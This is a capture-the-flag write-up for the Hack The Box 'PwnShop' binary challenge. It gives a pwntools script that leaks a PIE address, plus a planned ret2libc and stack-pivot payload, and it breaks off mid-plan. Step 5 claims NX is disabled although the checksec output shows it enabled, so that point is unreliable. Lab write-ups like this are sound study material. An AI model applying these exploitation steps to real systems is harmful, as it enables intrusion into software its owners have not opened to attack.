# PwnShop
## DESCRIPTION:
We just opened a Pwn Shop, time to pwn all the things!
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and stripped.

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/pwn_pwnshop]
└─$ file pwnshop
pwnshop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e354418962cffebad74fa44061f8c58d92c0e706, for GNU/Linux 3.2.0, stripped
```

> BINARY PROTECTIONS

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/pwn_pwnshop]
└─$ pwn checksec pwnshop                                    
[*] '/home/brandy/Downloads/pwn_pwnshop/pwnshop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

2. After decompiled the binary, it seems we can leak pie and calculate the piebase at the sell option.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0bb3e8ee-b09d-411c-b73d-06d2f22a6e94)


3. We can use our classic way to leak pie by sending 7 bytes.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5272357b-06b4-4846-875f-e95a21456cb6)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/08f381c9-6586-417d-b82f-1806f2f7e1e7)


> SCRIPT

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
continue
""".format(**locals())

exe = './pwnshop'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

sh = start()
pause()
sh.sendlineafter(b'>', b'2')
sh.sendlineafter(b'?', b'a')

## LEAKING PIE
sh.sendlineafter(b'?', b'A' * 7) 
sh.recvline()
get = unpack(sh.recv(6) + b'\x00' * 2)
log.success('LEAKED PIE --> %#0x', get)

elf.address = get - 0x40c0 # 16576
log.info(f'PIE BASE --> {hex(elf.address)}')

sh.interactive()
```

4. Next, analyzing the buy option, we know we can do BOF but sadly the space is too small.

> BUY OPTION

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8b5b6c49-b20c-4ffd-b255-af1c1de0eac4)


5. Knowing there is no interesting function to jump to and NX is disabled, but there is BOF; we know the concept for this challenge is ret2libc.
6. But since the distance between RBP and RIP is too small, hence it's not enough for our payload, we need to do **stack pivot**.

### FLOW

> Payload we need to send

```
padding (need to calculate it first btw) + rdi_gadget + function@got + function@plt + return_symbol + sub_rsp_gadget.
```

> Grabbing sub_rsp (dunno why can't automate the grab using ropstar).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/36d25dfd-4b78-4905-8fa9-629e28ff6c50)






